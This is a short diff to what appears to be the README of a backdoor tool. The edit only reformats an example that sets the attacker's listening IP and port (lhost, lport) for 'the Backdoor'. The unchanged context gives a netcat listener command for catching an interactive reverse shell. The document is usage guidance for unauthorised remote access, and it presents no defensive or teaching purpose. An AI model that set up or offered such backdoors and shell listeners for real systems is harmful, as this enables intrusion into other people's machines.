@@ -16,8 +16,9 @@
 * You just need to change 192.168.1.1 and 22
 * lhost = your IP adress
 * lport = the port you want to use for the Backdoor. I recommend ssh (22).
-* example: readonly lhost="192.168.4.20" <br/>
-           readonly lport="80"
+* example:
+* readonly lhost="192.168.4.20"
+* readonly lport="80"
 
 ## NetCat Command
     stty raw -echo; (stty size; cat) | nc -lvnp rport rhost
